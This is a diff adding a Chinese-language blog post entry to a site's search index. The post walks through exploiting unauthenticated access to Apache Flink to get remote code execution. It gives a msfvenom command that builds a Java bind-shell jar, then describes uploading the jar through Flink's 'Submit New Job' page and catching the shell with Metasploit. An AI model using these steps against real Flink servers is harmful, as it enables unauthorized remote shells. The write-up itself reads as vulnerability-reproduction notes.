@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>apache-flink-unauth-rce-不出网上线msf</title>
+    <link href="/2025/04/28/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/"/>
+    <url>/2025/04/28/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/</url>
+    
+    <content type="html"><![CDATA[<h2 id="apache-flink-unauth-rce-不出网上线msf"><a href="#apache-flink-unauth-rce-不出网上线msf" class="headerlink" title="apache-flink-unauth-rce-不出网上线msf"></a><strong>apache-flink-unauth-rce</strong>-不出网上线msf</h2><p>直接未授权访问</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114301788.png" alt="image-20250422114301788"></p><p>使用msf生成jar包</p><p>msfvenom -p java&#x2F;shell&#x2F;bind_tcp RHOST&#x3D;对方IP LPORT&#x3D;4654 -f jar &gt;hello.jar</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114803060.png" alt="image-20250422114803060"></p><p>将jar包上传到Submit New Job功能点</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114606956.png" alt="image-20250422114606956"></p><p>msf配置好监听</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114853776.png" alt="image-20250422114853776"></p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422114931707.png" alt="image-20250422114931707"></p><p>点击submit，我点了三次上线的，我着急，可能第一次就成功了。（页面会有报错信息出现，不知道为啥）</p><p><img src="/img/apache-flink-unauth-rce-%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFmsf/image-20250422115001475.png" alt="image-20250422115001475"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞复现</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>apache-flink</tag>
+      
+      <tag>rce</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>weblogic_2020-2551</title>
     <link href="/2025/02/07/weblogic-2020-2551/"/>
     <url>/2025/02/07/weblogic-2020-2551/</url>
